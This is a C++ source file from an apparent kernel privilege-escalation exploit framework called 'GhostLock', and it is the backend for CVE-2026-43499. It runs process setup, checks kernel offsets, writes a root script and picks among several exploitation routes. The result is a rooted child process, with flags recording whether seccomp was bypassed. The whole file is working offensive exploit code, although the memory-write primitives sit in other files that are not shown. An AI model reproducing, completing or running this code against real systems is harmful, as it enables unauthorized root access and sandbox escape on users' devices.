/*
 * GhostLock — cve_2026_43499 backend (T4).
 *
 * The backend is now instantiated on a backend step set (W1W3 / W1W2); the
 * W1 -> W2 (-> W3) sequence lives in backend/cve_2026_43499/steps.{hpp,cpp} and
 * the shared write primitives in the non-template Cve43499Primitives base. This
 * unit keeps only the middleware-free setup stage and the route dispatch. The
 * body is otherwise unchanged: same statements, same order, same log text.
 */

#include "backend/cve_2026_43499_backend.hpp"
#include "backend/cve_2026_43499_state.hpp"

#include "backend/cve_2026_43499/backend_profile.hpp"
#include "backend/cve_2026_43499/bootstrap.hpp"
#include "profile/document.hpp"
#include "backend/cve_2026_43499/route/route_policy.hpp"
#include "platform/runtime.hpp"
#include "terminal/root_script.hpp"
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "support/log.hpp"
#include "backend/cve_2026_43499/route/route_api.hpp"
#include "support/timing.hpp"

#include "support/fatal_error.hpp"
#include "support/decls.hpp"
#include "terminal/handoff_probe.hpp"

#include <array>
#include <utility>

namespace ghostlock::backend {
    /* The session types this unit used to see through the enclosing session
     * namespace (victim, plugin, g_exploit_session, ...). */
    using namespace ghostlock::session;
    using ghostlock::session::CoreSession;
    using ghostlock::contract::StageResult;
    namespace {
        /* Stage: process setup and profile installation (middleware-free). */
        StageResult run_setup(CoreSession &session, const char *debug_dir,
                              bool force_attack) {
            ghostlock::backend::cve43499_state(session).heap.init();
            support::disable_rseq_for_thread();
            memory::set_unbuffer();
            signal(SIGPIPE, SIG_IGN);
            memory::set_limit();
            ghostlock::backend::cve_2026_43499::route::reserve_standard_io();
            if (config::runtime_config_snapshot().init() != 0) {
                pr_error("runtime configuration failed errno=%d\n", errno);
                throw FatalError{};
            }
            if (debug_dir && debug_dir[0])
                config::runtime_config_snapshot().debug_dir = debug_dir;
            /* state_from already bound the Document and installed the frozen
             * TargetProfile; this validates the running kernel and logs. */
            install_profile();
            /* Robustness guard: running the attack where KernelSU already owns root
             * drives the re-enforce path that panics the kernel at the first PI
             * route, and the objective is already met. Bail out cleanly instead; a
             * cold boot clears the module for a real run. The forced test skips
             * this check on purpose and relies on the root script discarding the
             * child. */
            if (!force_attack && ghostlock::terminal::ksu_root_owned()) {
                pr_warning("KernelSU already has root; skipping exploit "
                    "(cold boot for a clean run, or enable the forced test)\n");
                return StageResult::Done;
            }
            terminal::write_root_script(
                    ghostlock::backend::cve43499_state(session).profile.safe_mode());

            const profile::kernel_offsets *iomem_values =
                ghostlock::backend::cve43499_state(session).profile.values();
            platform::runtime::apply_iomem_cache(
                config::runtime_config_snapshot().home_dir.c_str(),
                iomem_values && iomem_values->uname_r ? iomem_values->uname_r : "");
            support::log_startup_context();
            support::init_p0_profile();
            memory::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
            pr_info("main thread running on cpu=%d\n", sched_getcpu());

            support::timer_reset();
            support::timer_mark("exploit start");
            return StageResult::Continue;
        }
    } // namespace

    template <class StepSet>
    profile::BindStatus Cve2026_43499Backend<StepSet>::state_from(
            CoreSession &session, const profile::Document &document) {
        std::array<char, 256> release_buf{};
        profile::kernel_offsets values{};
        const uint8_t route = static_cast<uint8_t>(document.middleware);
        const profile::BindStatus status =
                ghostlock::backend::cve_2026_43499::backend_profile::bind(
                        document, route, &values, release_buf.data(),
                        release_buf.size());
        if (!status.ok()) return status;
        ghostlock::backend::cve43499_state(session).profile =
                profile::TargetProfile::from(&values);
        return status;
    }

    /* setup -> StepSet::run<Route> -> transfer the rooted child to the terminal. */
    template <class StepSet>
    StageResult Cve2026_43499Backend<StepSet>::run(CoreSession &session,
                                                   const char *debug_dir, bool force_attack,
                                                   ghostlock::terminal::RootedChild &out) {
        switch (run_setup(session, debug_dir, force_attack)) {
            case StageResult::Failed:
                return StageResult::Failed;
            case StageResult::Done:
                return StageResult::Done;
            case StageResult::Continue:
                break;
        }

        VictimChain chain{};
        StageResult result;
        switch (ghostlock::backend::cve43499_state(session).profile.route()) {
            case profile::RouteKind::SelectStack:
                result = StepSet::template run<ghostlock::backend::cve_2026_43499::route::SelectPolicy>(session, chain);
                break;
            case profile::RouteKind::TcpZerocopy:
                result = StepSet::template run<ghostlock::backend::cve_2026_43499::route::TcpPolicy>(session, chain);
                break;
            case profile::RouteKind::MulticastWaiter:
                result = StepSet::template run<ghostlock::backend::cve_2026_43499::route::MulticastPolicy>(session, chain);
                break;
            default:
                pr_warning("no route selected in profile\n");
                return StageResult::Failed;
        }
        if (result != StageResult::Continue) return result;

        /* Transfer the rooted-child handoff out of the backend state, keeping the
         * original live/parked split: the live branch hands over the victim
         * context's command fd and releases the child; the parked branch hands
         * over the parked child's fd. uid_read moves in both cases so the
         * terminal resets it at the original point. */
        auto &state = ghostlock::backend::cve43499_state(session);
        out.alive = chain.child_alive != 0;
        out.seccomp_bypassed = chain.seccomp_ok != 0;
        out.ever_rooted = chain.ever_rooted != 0;
        out.uid_read = std::move(state.victim.uid_read);
        if (chain.child_alive) {
            out.pid = state.victim.release_child();
            out.command = std::move(state.victim.cmd_write);
            /* The old terminal reset the parked cmd fd on the live branch too. */
            state.parked_victim_cmd.reset();
        } else if (state.parked_victim > 0) {
            out.pid = state.parked_victim;
            state.parked_victim = -1;
            out.command = std::move(state.parked_victim_cmd);
        }
        return StageResult::Continue;
    }

    /* Explicit instantiations: 2 step sets x 3 catalogued routes are driven by
     * run()'s switch, and the StepSet::run<Route> bodies are instantiated in
     * steps.cpp. Callers only include the header. */
    template struct Cve2026_43499Backend<W1W3Steps>;
    template struct Cve2026_43499Backend<W1W2Steps>;
} // namespace ghostlock::backend
